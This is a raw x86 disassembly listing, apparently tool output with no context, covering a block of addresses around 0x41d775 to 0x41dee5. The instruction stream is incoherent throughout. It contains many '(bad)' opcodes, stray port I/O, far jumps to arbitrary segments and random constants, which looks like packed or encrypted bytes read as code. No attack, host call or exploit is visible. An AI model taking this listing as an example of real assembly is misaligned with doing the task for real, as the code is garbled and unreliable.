  41d775:	test   eax,0xa3acee3e
  41d77a:	pusha  
  41d77b:	mov    ah,0xf3
  41d77d:	repz or bh,BYTE PTR [ebx-0x15e74199]
  41d784:	sub    al,0x2d
  41d786:	xchg   esp,eax
  41d787:	add    cl,ch
  41d789:	mov    cl,0x8d
  41d78b:	mov    BYTE PTR [ebx-0x38],dh
  41d78e:	push   ds
  41d78f:	mov    ds:0x49190116,eax
  41d794:	lahf   
  41d795:	mov    esp,0x98a2f0e8
  41d79a:	add    al,0x2b
  41d79c:	fdivr  st,st(6)
  41d79e:	cmp    ebx,edi
  41d7a0:	adc    eax,0x3287ddb3
  41d7a5:	and    al,0x66
  41d7a7:	mov    ch,0xf0
  41d7a9:	jbe    0x41d78c
  41d7ab:	stos   BYTE PTR es:[edi],al
  41d7ac:	loop   0x41d7e0
  41d7ae:	loopne 0x41d77a
  41d7b0:	add    eax,0xd1c03431
  41d7b5:	loopne 0x41d73b
  41d7b7:	cli    
  41d7b8:	pop    ds
  41d7b9:	jmp    0x5fda:0x7369dbaa
  41d7c0:	and    BYTE PTR [edi+0x3b9492b5],0x65
  41d7c7:	bound  ecx,QWORD PTR [ebx]
  41d7c9:	mov    DWORD PTR [ebx],esi
  41d7cb:	sbb    DWORD PTR [ecx-0x35605b92],esi
  41d7d1:	jnp    0x41d838
  41d7d3:	imul   edx,DWORD PTR [eax],0x8939da39
  41d7d9:	fwait
  41d7da:	pop    ebx
  41d7db:	scas   al,BYTE PTR es:[edi]
  41d7dc:	pop    esp
  41d7dd:	popa   
  41d7de:	jl     0x41d812
  41d7e0:	mov    edx,0xca23760a
  41d7e5:	and    DWORD PTR [edx+0x2c],esi
  41d7e8:	add    ebx,DWORD PTR [ecx]
  41d7ea:	in     al,dx
  41d7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7ed:	loope  0x41d7d5
  41d7ef:	inc    edi
  41d7f0:	push   esp
  41d7f1:	popf   
  41d7f2:	sub    cl,bl
  41d7f4:	mov    edi,0xbf201787
  41d7f9:	jle    0x41d83c
  41d7fb:	rcr    bh,cl
  41d7fd:	stos   BYTE PTR es:[edi],al
  41d7fe:	jbe    0x41d7b4
  41d800:	push   edx
  41d801:	and    ah,BYTE PTR [edi+0x68]
  41d804:	shr    DWORD PTR [edi-0x43],1
  41d807:	cmp    al,0x1f
  41d809:	popa   
  41d80a:	rcr    DWORD PTR [edi+0x3f3f1a95],cl
  41d810:	cld    
  41d811:	loope  0x41d7a1
  41d813:	js     0x41d834
  41d815:	loopne 0x41d827
  41d817:	pop    ebp
  41d818:	add    DWORD PTR [ecx+ecx*2],ebp
  41d81b:	cmp    eax,0x8e7aa1e7
  41d820:	lds    eax,FWORD PTR gs:[edi]
  41d823:	cmp    ecx,DWORD PTR [esi-0x74]
  41d826:	jae    0x41d834
  41d828:	stc    
  41d829:	or     eax,0x881979f8
  41d82e:	das    
  41d82f:	pop    ebx
  41d830:	pop    edi
  41d831:	(bad)  
  41d832:	jo     0x41d806
  41d834:	aaa    
  41d835:	jl     0x41d89d
  41d837:	lea    eax,[ecx+0x309e6b1e]
  41d83d:	pop    esp
  41d83e:	pop    es
  41d83f:	scas   eax,DWORD PTR es:[edi]
  41d840:	mov    cl,0x17
  41d842:	fstp   DWORD PTR [ecx]
  41d844:	or     al,0x1c
  41d846:	shl    BYTE PTR [esi-0x2e],1
  41d849:	add    eax,0xc6ef8a04
  41d84e:	sahf   
  41d84f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d850:	push   ebp
  41d851:	fstp   QWORD PTR [esi+edi*2+0x2c]
  41d855:	sub    al,0xf9
  41d857:	mov    eax,0x206c6ad6
  41d85c:	push   0x3c
  41d85e:	mov    ?,WORD PTR [ebp-0x14]
  41d861:	xchg   esi,eax
  41d862:	aad    0xd0
  41d864:	jns    0x41d819
  41d866:	push   ds
  41d867:	dec    edi
  41d868:	(bad)  
  41d869:	frstor [edi-0x30074129]
  41d86f:	clc    
  41d870:	fdiv   st,st(4)
  41d872:	jmp    0x9b2c3c6c
  41d877:	and    al,0x4b
  41d879:	mov    bh,0x6a
  41d87b:	mov    WORD PTR [esi+0x1e],cs
  41d87e:	inc    ebp
  41d87f:	and    DWORD PTR [ecx+edi*4+0x2604fb04],ebx
  41d886:	mov    ds:0xc2fc596e,eax
  41d88b:	sbb    al,0x86
  41d88d:	add    DWORD PTR [eax-0x24],edi
  41d890:	(bad)  
  41d891:	repz retf 0x32ff
  41d895:	enter  0xe6c3,0x80
  41d899:	xor    al,0x30
  41d89b:	xchg   ebp,eax
  41d89c:	mov    bh,0x7c
  41d89e:	fadd   DWORD PTR ds:[eax+0x7bb02508]
  41d8a5:	imul   esp,DWORD PTR [ebx],0x10235af9
  41d8ab:	mov    ecx,0xb58bf2d3
  41d8b0:	xor    al,0xe9
  41d8b2:	sub    DWORD PTR ds:0x59a20cd4,ebx
  41d8b8:	das    
  41d8b9:	popa   
  41d8ba:	inc    DWORD PTR [ecx+0x1d45be89]
  41d8c0:	jecxz  0x41d865
  41d8c2:	in     eax,dx
  41d8c3:	dec    ebx
  41d8c4:	test   al,0x44
  41d8c6:	inc    edi
  41d8c7:	gs mov esp,0x20c429fd
  41d8cd:	pop    esi
  41d8ce:	aaa    
  41d8cf:	iret   
  41d8d0:	sub    DWORD PTR [ebp+0x22d48fb4],edx
  41d8d6:	stos   BYTE PTR es:[edi],al
  41d8d7:	out    dx,al
  41d8d8:	push   0xc871fa14
  41d8dd:	mov    dl,0xb7
  41d8df:	jbe    0x41d959
  41d8e1:	sbb    bl,BYTE PTR [ecx+0x7]
  41d8e4:	and    BYTE PTR [ecx],cl
  41d8e6:	mov    edi,0x7712599f
  41d8eb:	call   0xa978:0x61045669
  41d8f2:	enter  0xb880,0x67
  41d8f6:	jmp    0xb2e9794e
  41d8fb:	or     esp,DWORD PTR [eax]
  41d8fd:	hlt    
  41d8fe:	jb     0x41d8f3
  41d900:	popa   
  41d901:	push   eax
  41d902:	popf   
  41d903:	aam    0x42
  41d905:	push   ebx
  41d906:	lock pop ds
  41d908:	popa   
  41d909:	mov    eax,0xbe35239b
  41d90e:	add    al,0x87
  41d910:	pop    eax
  41d911:	mov    dh,0x4b
  41d913:	inc    esi
  41d914:	pop    edi
  41d915:	mov    edx,0x158652e2
  41d91a:	jne    0x41d93d
  41d91c:	inc    edx
  41d91d:	aaa    
  41d91e:	mov    bl,0x4e
  41d920:	arpl   WORD PTR cs:[eax+0x19],sp
  41d924:	mov    esp,0x2383f7ce
  41d929:	outs   dx,BYTE PTR ds:[esi]
  41d92a:	and    BYTE PTR [edx],0x48
  41d92d:	adc    al,0x2f
  41d92f:	inc    ebx
  41d930:	fwait
  41d931:	push   edi
  41d932:	fwait
  41d933:	ins    BYTE PTR es:[edi],dx
  41d934:	popa   
  41d935:	sub    BYTE PTR [eax-0x6f],bl
  41d938:	add    ebp,esi
  41d93a:	sbb    eax,DWORD PTR [edi-0x72bec51a]
  41d940:	pop    es
  41d941:	mov    fs,WORD PTR [esi]
  41d943:	test   BYTE PTR [edi+0x0],al
  41d946:	xchg   edi,eax
  41d947:	neg    DWORD PTR [ebx-0x4eb90ddf]
  41d94d:	cmc    
  41d94e:	test   al,0x46
  41d950:	loopne 0x41d8e5
  41d952:	outs   dx,BYTE PTR ds:[esi]
  41d953:	lea    ecx,[esi+ecx*2]
  41d956:	out    dx,al
  41d957:	and    eax,0x2864cd1c
  41d95c:	pop    es
  41d95d:	mov    dh,0x65
  41d95f:	rol    bl,1
  41d961:	rcl    BYTE PTR [edi-0x634765b3],cl
  41d967:	or     al,0x7a
  41d969:	mov    gs,WORD PTR [ecx]
  41d96b:	shr    ebp,1
  41d96d:	cmc    
  41d96e:	mov    ebx,0x9552b25c
  41d973:	neg    BYTE PTR [edi]
  41d975:	scas   al,BYTE PTR es:[edi]
  41d976:	daa    
  41d977:	push   0x76
  41d979:	test   DWORD PTR [ebp-0x27],edx
  41d97c:	(bad)  
  41d97e:	pop    esi
  41d97f:	xchg   ecx,eax
  41d980:	dec    edx
  41d981:	fldenv [edx+ebp*8]
  41d984:	nop
  41d985:	or     ch,ch
  41d987:	int    0x7
  41d989:	mov    ds:0x1665d03a,al
  41d98e:	or     bl,dl
  41d990:	push   edi
  41d991:	into   
  41d992:	cdq    
  41d993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d994:	or     BYTE PTR [edi+ecx*1],bh
  41d997:	loop   0x41d9bd
  41d999:	adc    ebx,ebx
  41d99b:	xlat   BYTE PTR ds:[ebx]
  41d99c:	inc    esp
  41d99d:	lea    ebp,[ecx]
  41d99f:	sbb    esp,DWORD PTR ds:0xf3795ddc
  41d9a5:	jecxz  0x41d9a5
  41d9a7:	arpl   WORD PTR [edx-0x80],bx
  41d9aa:	mov    bh,0xa8
  41d9ac:	and    bl,bh
  41d9ae:	repz arpl WORD PTR [eax-0x76],sp
  41d9b2:	(bad)  
  41d9b3:	mov    ebp,0x88950372
  41d9b8:	sbb    BYTE PTR [esi+0x73928e99],0x2
  41d9bf:	jne    0x41d982
  41d9c1:	pop    edi
  41d9c2:	or     BYTE PTR [ebp-0x3abc8e09],dl
  41d9c8:	sbb    al,0x4a
  41d9ca:	inc    edx
  41d9cb:	hlt    
  41d9cc:	inc    ebp
  41d9cd:	jp     0x41da3b
  41d9cf:	xor    ch,BYTE PTR [esi+0x4291c7b3]
  41d9d5:	lock dec esp
  41d9d7:	je     0x41d9d7
  41d9d9:	pusha  
  41d9da:	adc    esp,DWORD PTR [eax+eiz*2]
  41d9dd:	arpl   WORD PTR [edx+0x3],bp
  41d9e0:	dec    eax
  41d9e1:	xor    DWORD PTR [esi],0x7bfa7053
  41d9e7:	in     al,dx
  41d9e8:	xchg   esi,eax
  41d9e9:	push   0x92858327
  41d9ee:	jmp    0x4ce4:0x92c50978
  41d9f5:	not    DWORD PTR [esi]
  41d9f7:	(bad)  
  41d9f8:	jmp    0x3aefc362
  41d9fd:	pusha  
  41d9fe:	into   
  41d9ff:	xchg   ecx,eax
  41da00:	jnp    0x41d9bc
  41da02:	ins    BYTE PTR es:[edi],dx
  41da03:	data16 movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  41da06:	push   esi
  41da07:	push   es
  41da08:	(bad)  
  41da0a:	mov    dl,0x2a
  41da0c:	ret    
  41da0d:	jbe    0x41d9c6
  41da0f:	repnz test al,0x74
  41da12:	es scas eax,DWORD PTR es:[edi]
  41da14:	sahf   
  41da15:	xor    BYTE PTR [eax+0x51],0x3b
  41da19:	(bad)  [eax]
  41da1b:	std    
  41da1c:	and    eax,0x74763b34
  41da21:	mov    dh,BYTE PTR [ecx-0x71]
  41da24:	ds in  al,0x8d
  41da27:	sahf   
  41da28:	shr    BYTE PTR [edx+0x505da8d9],0x7f
  41da2f:	and    eax,0x5df76107
  41da34:	xchg   esi,ebp
  41da36:	push   eax
  41da37:	dec    esi
  41da38:	imul   ebp,eax,0xffffffb0
  41da3b:	mov    BYTE PTR [ecx+0x6c6d35fb],ch
  41da41:	popa   
  41da42:	test   BYTE PTR [ecx],ah
  41da44:	push   cs
  41da45:	or     al,dl
  41da47:	out    dx,eax
  41da48:	mov    bl,0xa5
  41da4a:	(bad)  
  41da4b:	gs mov al,0xe2
  41da4e:	(bad)  
  41da4f:	fsub   QWORD PTR [ebx]
  41da51:	lea    ebx,ds:0x2fed1bb5
  41da57:	lahf   
  41da58:	nop
  41da59:	sbb    BYTE PTR [edx],dh
  41da5b:	sbb    ecx,ebx
  41da5d:	addr16 ret 0xc342
  41da61:	imul   eax,DWORD PTR [ecx],0xfffffffe
  41da64:	add    eax,0x3f18cae4
  41da69:	pop    esp
  41da6a:	and    ebx,edx
  41da6c:	jnp    0x41da33
  41da6e:	in     al,0xcf
  41da70:	lods   eax,DWORD PTR ds:[esi]
  41da71:	sbb    al,0x4e
  41da73:	popa   
  41da74:	fs xchg edi,eax
  41da76:	in     eax,0xed
  41da78:	sub    DWORD PTR [edx],eax
  41da7a:	mov    ds:0x1075d77e,al
  41da7f:	out    0x78,eax
  41da81:	cdq    
  41da82:	fcom   DWORD PTR [ebx+0x4d689383]
  41da88:	mov    eax,ds:0x232c20db
  41da8d:	mov    al,ds:0x5b33837b
  41da92:	cwde   
  41da93:	cmp    esp,esi
  41da95:	jae    0x41db0c
  41da97:	int    0xda
  41da99:	xchg   esp,eax
  41da9a:	ret    
  41da9b:	fidivr DWORD PTR es:[ecx+0x4e]
  41da9f:	xchg   DWORD PTR [edi],edi
  41daa1:	imul   eax,edx,0x19
  41daa4:	popa   
  41daa5:	mov    eax,ds:0xcb585d37
  41daaa:	add    bl,cl
  41daac:	jb     0x41daf7
  41daae:	bound  ecx,QWORD PTR [ebx+0x5a]
  41dab1:	(bad)  
  41dab2:	lods   eax,DWORD PTR ds:[esi]
  41dab3:	inc    ebx
  41dab4:	int    0x41
  41dab6:	ds push 0xa1a4ab9a
  41dabc:	pop    ebx
  41dabd:	sub    eax,0x5cfe330a
  41dac2:	popa   
  41dac3:	nop
  41dac4:	or     edi,ebp
  41dac6:	fmul   QWORD PTR [edx+0x11516a8d]
  41dacc:	or     DWORD PTR [bx+0x57],edi
  41dad0:	dec    edi
  41dad1:	or     edi,ebp
  41dad3:	imul   esi,DWORD PTR ds:0x2d4091c5,0xffffff84
  41dada:	lods   eax,DWORD PTR ds:[esi]
  41dadb:	xchg   esp,eax
  41dadc:	sbb    BYTE PTR [eax],dh
  41dade:	bound  ecx,QWORD PTR [edi-0xe]
  41dae1:	adc    DWORD PTR [ecx+0x26],edx
  41dae4:	or     bh,0x86
  41dae7:	repnz cli 
  41dae9:	test   DWORD PTR [ebp+0x55b7f3cd],0x4979288
  41daf3:	std    
  41daf4:	dec    edx
  41daf5:	ja     0x41db74
  41daf7:	cli    
  41daf8:	xchg   ebx,eax
  41daf9:	in     eax,dx
  41dafa:	and    esp,0xffffff9c
  41dafd:	neg    bh
  41daff:	push   ebp
  41db00:	xchg   ecx,eax
  41db01:	js     0x41dabc
  41db03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db04:	pusha  
  41db05:	jmp    0x41db2f
  41db07:	mov    esp,0xeb50e13
  41db0c:	xor    esi,DWORD PTR [eax-0x4973407d]
  41db12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db13:	and    ch,BYTE PTR [ebx+0x3f]
  41db16:	test   edx,edx
  41db18:	sub    ebp,DWORD PTR [ebp-0x1d]
  41db1b:	stos   DWORD PTR es:[edi],eax
  41db1c:	std    
  41db1d:	mov    ds:0x959c8adc,eax
  41db22:	shl    BYTE PTR [eax+0x16968b8b],cl
  41db28:	out    0x2b,al
  41db2a:	push   es
  41db2b:	push   ebx
  41db2c:	mov    ss,WORD PTR [edi]
  41db2e:	out    dx,al
  41db2f:	sbb    ecx,DWORD PTR [esi+0x33]
  41db32:	dec    edi
  41db33:	sbb    bh,BYTE PTR [esi]
  41db35:	(bad)  
  41db36:	push   ds
  41db37:	sbb    BYTE PTR [edi+ebx*1],al
  41db3a:	add    eax,0x5ae85e33
  41db3f:	pop    edi
  41db40:	retf   0xed64
  41db43:	gs stos DWORD PTR es:[edi],eax
  41db45:	dec    ecx
  41db46:	(bad)  
  41db47:	mov    al,0x2d
  41db49:	outs   dx,BYTE PTR ds:[esi]
  41db4a:	and    ecx,DWORD PTR [ecx*4+0x3c992720]
  41db51:	sub    ch,bh
  41db53:	xlat   BYTE PTR ds:[ebx]
  41db54:	aaa    
  41db55:	xor    ebp,edi
  41db57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db58:	push   es
  41db59:	dec    ecx
  41db5a:	aad    0x3b
  41db5c:	jl     0x41db4d
  41db5e:	test   DWORD PTR ds:0x654a3b52,ebx
  41db64:	data16 sub BYTE PTR [edi],dl
  41db67:	push   0x4f
  41db69:	xor    BYTE PTR [esi],al
  41db6b:	and    eax,0x2b7bbff1
  41db70:	jmp    0x41dbcc
  41db72:	dec    ebp
  41db73:	pop    eax
  41db74:	pop    esi
  41db75:	std    
  41db76:	js     0x41dbd3
  41db78:	cmp    DWORD PTR [ebx+0x74],edi
  41db7b:	xchg   edi,eax
  41db7c:	sbb    edi,esi
  41db7e:	sbb    edi,DWORD PTR [esi-0xac45a32]
  41db84:	add    eax,0x22d9a3c5
  41db89:	inc    ebx
  41db8a:	or     dl,BYTE PTR [ebp+eiz*2-0x11a22b51]
  41db91:	loope  0x41db3c
  41db93:	sub    DWORD PTR [ebx],eax
  41db95:	bound  ecx,QWORD PTR [eax]
  41db97:	mov    ds:0xc4733a66,eax
  41db9c:	jge    0x41dbee
  41db9e:	or     al,0x5d
  41dba0:	inc    edi
  41dba1:	mov    ah,0x1d
  41dba3:	jnp    0x41dbde
  41dba5:	sahf   
  41dba6:	add    BYTE PTR [eax-0x33d4fb2d],al
  41dbac:	adc    al,0x23
  41dbae:	dec    ecx
  41dbaf:	out    0x77,al
  41dbb1:	and    DWORD PTR [ebp+ebp*8-0x73aa5b35],ebp
  41dbb8:	xor    eax,0xa7d44030
  41dbbd:	hlt    
  41dbbe:	sub    al,0x1d
  41dbc0:	jg     0x41dbd6
  41dbc2:	shl    ah,cl
  41dbc4:	aad    0x6a
  41dbc6:	push   edx
  41dbc7:	xor    cl,BYTE PTR [edx-0x6727467e]
  41dbcd:	(bad)
  41dbd0:	fiadd  WORD PTR [ebp-0x1d329b2a]
  41dbd6:	das    
  41dbd7:	or     ebp,DWORD PTR [ecx]
  41dbd9:	cwde   
  41dbda:	inc    edx
  41dbdb:	cmc    
  41dbdc:	xchg   ebp,eax
  41dbdd:	cmp    esp,DWORD PTR [ebp+0x71c5eaee]
  41dbe3:	xchg   DWORD PTR [edi],ecx
  41dbe5:	fidiv  WORD PTR [esi+0x16]
  41dbe8:	les    edx,FWORD PTR [edx-0x1c10a955]
  41dbee:	cmp    al,0x1b
  41dbf0:	call   DWORD PTR [eax-0x7d01d3b9]
  41dbf6:	lahf   
  41dbf7:	lock jae 0x41dc19
  41dbfa:	xchg   ecx,eax
  41dbfb:	xchg   DWORD PTR [esi+0x27],esi
  41dbfe:	dec    edi
  41dbff:	mov    ah,0xf2
  41dc01:	push   0xe6d4c7db
  41dc06:	scas   al,BYTE PTR es:[edi]
  41dc07:	popa   
  41dc08:	mov    dl,0x4e
  41dc0a:	sbb    al,0xc0
  41dc0c:	and    bl,BYTE PTR [edi-0x71]
  41dc0f:	hlt    
  41dc10:	dec    ebx
  41dc11:	enter  0xcf9f,0x38
  41dc15:	push   esi
  41dc16:	(bad)  
  41dc17:	pop    eax
  41dc18:	inc    esp
  41dc19:	pushf  
  41dc1a:	cmc    
  41dc1b:	xchg   ebp,eax
  41dc1c:	mov    bh,0xb7
  41dc1e:	pop    ebp
  41dc1f:	js     0x41dbbf
  41dc21:	xchg   ebx,eax
  41dc22:	jne    0x41dc54
  41dc24:	jle    0x41dc8d
  41dc26:	or     BYTE PTR [edi+0x296c6794],bl
  41dc2c:	dec    edi
  41dc2d:	dec    ebx
  41dc2e:	es mov ebp,DWORD PTR cs:[esi]
  41dc32:	inc    eax
  41dc33:	shrd   DWORD PTR [esi-0x5a],edi,cl
  41dc37:	shr    BYTE PTR [esi-0x4f],0x3a
  41dc3b:	mov    BYTE PTR [esi+0x47],ah
  41dc3e:	adc    al,0x70
  41dc40:	cmp    al,0x81
  41dc42:	icebp  
  41dc43:	push   0xe0952006
  41dc48:	mov    ebx,0x16e70da8
  41dc4d:	data16 sbb BYTE PTR [ebx-0x765c2dc9],0x94
  41dc55:	jmp    0x41dca9
  41dc57:	push   esp
  41dc58:	dec    ecx
  41dc59:	dec    esi
  41dc5a:	sbb    ch,bh
  41dc5c:	test   BYTE PTR [ebp+0x4c33eb92],0xe9
  41dc63:	ins    BYTE PTR es:[edi],dx
  41dc64:	or     al,0x2
  41dc66:	imul   ebp,DWORD PTR [ecx],0x7d260fec
  41dc6c:	adc    DWORD PTR [ecx],esp
  41dc6e:	mov    eax,0xafff2ed4
  41dc73:	or     al,al
  41dc75:	jp     0x41dc9b
  41dc77:	loopne 0x41dc46
  41dc79:	push   ebx
  41dc7a:	fcom   QWORD PTR [eax+0x6db04573]
  41dc80:	and    esp,DWORD PTR [ebx-0x4aa5da9d]
  41dc86:	jae    0x41dcba
  41dc88:	or     bh,al
  41dc8a:	je     0x41dc58
  41dc8c:	and    BYTE PTR [edi-0x3e],cl
  41dc8f:	push   0x6dd3126
  41dc94:	addr16 lock out dx,eax
  41dc97:	dec    ecx
  41dc98:	ins    BYTE PTR es:[edi],dx
  41dc99:	icebp  
  41dc9a:	outs   dx,DWORD PTR ds:[esi]
  41dc9b:	js     0x41dc31
  41dc9d:	scas   al,BYTE PTR es:[edi]
  41dc9e:	test   eax,0xb38215be
  41dca3:	iret   
  41dca4:	das    
  41dca5:	mov    ecx,0x50bdfdda
  41dcaa:	jbe    0x41dc89
  41dcac:	(bad)  
  41dcad:	aam    0x79
  41dcaf:	mov    dl,0x42
  41dcb1:	and    DWORD PTR [ecx-0x8315a13],esp
  41dcb7:	loop   0x41dc58
  41dcb9:	fcmovb st,st(6)
  41dcbb:	ins    DWORD PTR es:[edi],dx
  41dcbc:	imul   esp,ecx,0x9
  41dcbf:	je     0x41dd40
  41dcc1:	ror    DWORD PTR [edx+ebp*1],0xac
  41dcc5:	iret   
  41dcc6:	clc    
  41dcc7:	repz add BYTE PTR [esi],al
  41dcca:	leave  
  41dccb:	fsub   DWORD PTR [ebp+0x4226d343]
  41dcd1:	sbb    DWORD PTR [bx-0xe],0xffffffce
  41dcd6:	ror    DWORD PTR [ecx],0x26
  41dcd9:	push   0xffffffaf
  41dcdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcdc:	mov    eax,ds:0x5f59f141
  41dce1:	xchg   ebx,eax
  41dce2:	cmc    
  41dce3:	jp     0x41dd52
  41dce5:	mov    cl,0xad
  41dce7:	out    0x1f,eax
  41dce9:	mov    ah,0x54
  41dceb:	inc    ebp
  41dcec:	out    0x1f,eax
  41dcee:	mov    ebx,0x9ca98d1a
  41dcf3:	lods   al,BYTE PTR ds:[esi]
  41dcf4:	test   al,0x32
  41dcf6:	mov    ds:0x6b3e96ac,al
  41dcfb:	xchg   ebx,eax
  41dcfc:	cmp    ebp,edi
  41dcfe:	sbb    esp,ebp
  41dd00:	add    esi,esp
  41dd02:	shl    BYTE PTR [ebx-0x3fe5469a],1
  41dd08:	(bad)  [ebx-0x36b319a]
  41dd0e:	add    ah,BYTE PTR [ebx+0x54]
  41dd11:	retf   0x52ce
  41dd14:	(bad)  
  41dd15:	push   esi
  41dd16:	cmp    DWORD PTR [edi],esi
  41dd18:	sbb    al,0xc1
  41dd1a:	adc    edi,DWORD PTR [ecx]
  41dd1c:	dec    ecx
  41dd1d:	push   cs
  41dd1e:	mov    cs,eax
  41dd20:	and    DWORD PTR [ebx-0x26],esp
  41dd23:	test   eax,0x30f6a478
  41dd28:	push   0xffffffaf
  41dd2a:	imul   ebx,DWORD PTR [edi],0xb50b4583
  41dd30:	xor    ebx,ebx
  41dd32:	nop
  41dd33:	jg     0x41dce4
  41dd35:	sub    ebx,esp
  41dd37:	cwde   
  41dd38:	jmp    0x41dcec
  41dd3a:	mov    esi,0x90adae73
  41dd3f:	jns    0x41dcda
  41dd41:	sub    BYTE PTR [eax],cl
  41dd43:	arpl   WORD PTR [esi-0x5b],di
  41dd46:	jg     0x41dd25
  41dd48:	test   al,0xe7
  41dd4a:	jecxz  0x41dd5a
  41dd4c:	jmp    0x41dd8c
  41dd4e:	or     BYTE PTR [eax+0x9438a16],al
  41dd54:	mov    cl,0x84
  41dd56:	mov    ds:0xccccec81,al
  41dd5b:	push   esi
  41dd5c:	ret    
  41dd5d:	or     al,0xd7
  41dd5f:	adc    edx,ebp
  41dd61:	adc    al,0xf3
  41dd63:	push   es
  41dd64:	stos   BYTE PTR es:[edi],al
  41dd65:	push   0xf07cbd10
  41dd6a:	imul   edx,DWORD PTR [ebx-0x1d2d177],0xfc3c8fd2
  41dd74:	push   cs
  41dd75:	dec    eax
  41dd76:	pushf  
  41dd77:	cdq    
  41dd78:	inc    edi
  41dd79:	leave  
  41dd7a:	call   0x79fb:0x50f1885b
  41dd81:	and    esp,edx
  41dd83:	xchg   BYTE PTR [ebx],ch
  41dd85:	cmp    BYTE PTR [ebx+eiz*2-0x35727498],dh
  41dd8c:	(bad)  
  41dd8d:	fwait
  41dd8e:	mov    ebp,0xa9e79827
  41dd93:	xlat   BYTE PTR ds:[ebx]
  41dd94:	lds    edi,FWORD PTR [esi]
  41dd96:	xlat   BYTE PTR ds:[ebx]
  41dd97:	nop    DWORD PTR [ecx-0x54]
  41dd9b:	dec    ecx
  41dd9c:	rcl    DWORD PTR [ebx+0x16],0x7c
  41dda0:	add    BYTE PTR [edx+0x4a],0x55
  41dda4:	lock inc eax
  41dda6:	jge    0x41ddc6
  41dda8:	push   esp
  41dda9:	mov    esp,ebx
  41ddab:	das    
  41ddac:	mov    edi,0x4fa05a70
  41ddb1:	stc    
  41ddb2:	out    dx,al
  41ddb3:	repz into 
  41ddb5:	call   0xcccffbd2
  41ddba:	dec    edx
  41ddbb:	lods   al,BYTE PTR ds:[esi]
  41ddbc:	add    eax,0x496003e3
  41ddc1:	shl    al,0xcc
  41ddc4:	mov    ds:0x1ca3670f,al
  41ddc9:	sbb    al,0x2c
  41ddcb:	div    BYTE PTR [edi+0x17030e37]
  41ddd1:	ins    DWORD PTR es:[edi],dx
  41ddd2:	add    BYTE PTR gs:[edi-0x2c],bh
  41ddd6:	jecxz  0x41ddd3
  41ddd8:	popf   
  41ddd9:	jl     0x41dd61
  41dddb:	shl    BYTE PTR [ebx],1
  41dddd:	or     BYTE PTR [ebx-0x432ac55d],0xe2
  41dde4:	sub    al,0x56
  41dde6:	cdq    
  41dde7:	mov    bl,0x61
  41dde9:	inc    edx
  41ddea:	lds    edx,FWORD PTR [esi+0xe342f5c]
  41ddf0:	xor    al,0x8a
  41ddf2:	jae    0x41ddb7
  41ddf4:	add    ebx,DWORD PTR [edx-0xf659abd]
  41ddfa:	add    bl,BYTE PTR [ecx]
  41ddfc:	sub    BYTE PTR [ebp-0x7d],al
  41ddff:	neg    DWORD PTR [ebp+0x25d5e0d4]
  41de05:	cmp    al,0xf
  41de07:	out    0x68,al
  41de09:	(bad)  
  41de0a:	push   esp
  41de0b:	push   edi
  41de0c:	sbb    dl,BYTE PTR [edx-0x74251087]
  41de12:	mov    bl,0x52
  41de14:	arpl   WORD PTR [eax+0x79bd10f3],dx
  41de1a:	jl     0x41de75
  41de1c:	lahf   
  41de1d:	int3   
  41de1e:	cmp    eax,0x120e8793
  41de23:	fmulp  st(6),st
  41de25:	mov    eax,ds:0x18793981
  41de2a:	cld    
  41de2b:	out    0x82,eax
  41de2d:	addr16 pop esi
  41de2f:	sub    DWORD PTR fs:[ecx-0x23e1b1d3],esi
  41de36:	test   DWORD PTR [ebx],edi
  41de38:	fucom  st(5)
  41de3a:	in     al,0x2d
  41de3c:	push   esi
  41de3d:	or     DWORD PTR [eax+0x1],0xf3ba5f7b
  41de44:	das    
  41de45:	mov    BYTE PTR [edx-0x59],bh
  41de48:	sub    DWORD PTR [edi-0x13],0x70
  41de4c:	xlat   BYTE PTR ds:[ebx]
  41de4e:	mov    esp,0x6b35cf7b
  41de53:	inc    esp
  41de54:	xor    DWORD PTR [edx],eax
  41de56:	pop    ebx
  41de57:	ret    0x9b05
  41de5a:	sub    eax,0x6723923a
  41de5f:	ret    
  41de60:	pushf  
  41de61:	jle    0x41de43
  41de63:	pushaw 
  41de65:	pop    es
  41de66:	xchg   edx,eax
  41de67:	mov    dl,BYTE PTR ds:0x1e55d258
  41de6d:	jne    0x41de0f
  41de6f:	std    
  41de70:	mov    ds:0x83085ffc,eax
  41de75:	mov    ch,BYTE PTR [esi]
  41de77:	das    
  41de78:	inc    DWORD PTR [eax]
  41de7a:	stos   DWORD PTR es:[edi],eax
  41de7b:	push   esi
  41de7c:	and    DWORD PTR [ebx-0x74fe14ff],ecx
  41de82:	push   es
  41de83:	lods   eax,DWORD PTR ds:[esi]
  41de84:	and    al,0xb0
  41de86:	fldenv [ecx+0xb]
  41de89:	test   BYTE PTR [ebp+edi*2-0x4a25eca8],ah
  41de90:	sbb    esp,esi
  41de92:	adc    DWORD PTR [ebx+0x5ebd40c8],0x56522cdb
  41de9c:	pop    esi
  41de9d:	jmp    0x41de68
  41de9f:	(bad)  
  41dea0:	sar    DWORD PTR ds:0x12505911,1
  41dea6:	imul   ebp,DWORD PTR [ebx-0x60e098d8],0xffffff99
  41dead:	push   ecx
  41deae:	dec    ecx
  41deaf:	sub    ah,dl
  41deb1:	xor    DWORD PTR [edx+eiz*1-0x9],esp
  41deb5:	ins    DWORD PTR es:[edi],dx
  41deb6:	pop    eax
  41deb7:	xchg   BYTE PTR [ebp+0x584624fe],ch
  41debd:	imul   esi,DWORD PTR [ecx+0x52f8aa26],0x12731493
  41dec7:	and    ah,ch
  41dec9:	inc    esp
  41deca:	stos   BYTE PTR es:[edi],al
  41decb:	bound  ecx,QWORD PTR [ebx]
  41decd:	lea    eax,[ecx-0xa]
  41ded0:	aam    0x51
  41ded2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ded3:	jmp    0x41de6a
  41ded5:	or     BYTE PTR [edi],dl
  41ded7:	sub    ah,BYTE PTR [ebx+esi*2-0x16]
  41dedb:	sbb    al,0x67
  41dedd:	add    ebx,DWORD PTR [esi+edi*1]
  41dee0:	mov    ebx,0x12323c4b
  41dee5:	in     al,0x33
